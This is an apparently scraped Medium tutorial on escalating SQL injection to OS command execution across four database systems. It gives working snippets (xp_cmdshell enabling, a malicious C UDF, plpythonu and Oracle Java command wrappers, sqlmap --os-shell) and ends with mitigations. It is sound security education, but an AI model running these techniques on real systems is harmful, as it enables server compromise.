---
title: "Exploiting SQL Injection for RCE: Four Techniques Across Popular Databases"
author: Anas Eladly (0x3adly)
url: https://medium.com/@0x3adly/from-sql-injection-to-rce-leveraging-vulnerability-for-maximum-impact-2fb356907eed
date_published: 2024-11-04
date_scraped: 2026-11-19
platform: medium
disclosed_report: none
bounty: not stated
vuln_class: sqli
---

<!-- Raw scraped text below. Public (not member-only). Full content captured. -->

# SQLi to RCE: four DBMS-specific techniques (0x3adly)

SQLi is not just data extraction; with sufficient privileges it reaches RCE. Four techniques across MSSQL, MySQL, PostgreSQL, Oracle.

## Method 1: MSSQL xp_cmdshell
`xp_cmdshell` runs OS commands from SQL. Enable it (needs sysadmin):
```
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
Then: `xp_cmdshell 'whoami';` runs commands as the SQL Server service user.

## Method 2: MySQL User Defined Functions (UDF)
UDFs are custom functions (written in C) loaded from a shared library. Abuse: upload a malicious `.so` to the MySQL plugin directory (needs write access, often via privesc/misconfig), then register and call it:
```c
long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error){
    if (args->arg_count != 1) return 0;
    system(args->args[0]);   // runs the command
    return 1;
}
```
```
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'malicious_udf.so';
SELECT sys_exec('whoami');
```

## Method 3: PostgreSQL untrusted procedural language (plpythonu)
If `plpythonu` is available, run Python (and thus OS commands) from SQL:
```
CREATE EXTENSION IF NOT EXISTS plpythonu;
CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS void AS $$
import os
os.system(cmd)
$$ LANGUAGE plpythonu;
SELECT exec_cmd('whoami');
```
(Modern Postgres also reachable via `COPY ... TO/FROM PROGRAM` for command execution.)

## Method 4: Oracle Java stored procedures
Oracle supports embedded Java. With privileges, create a Java source that runs commands, wrap it in PL/SQL, and call it:
```
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "CmdExec" AS
import java.io.*;
public class CmdExec {
  public static String runCmd(String cmd) throws IOException {
    Process proc = Runtime.getRuntime().exec(cmd);
    // read InputStream into a StringBuilder, return it
  }
}
CREATE OR REPLACE FUNCTION exec_cmd(cmd VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'CmdExec.runCmd(java.lang.String) return java.lang.String';
SELECT exec_cmd('whoami') FROM dual;
```

## Automating with sqlmap
`sqlmap -u "http://target.com/vulnerable_endpoint?param=value" --os-shell` attempts RCE automatically (picks the appropriate DBMS technique: xp_cmdshell, UDF, etc.).

## Lesson
Every one of these needs elevated DB privileges (sysadmin / FILE / plugin-dir write / Java privs). Least-privilege DB accounts are the key mitigation; parameterized queries stop the injection in the first place.
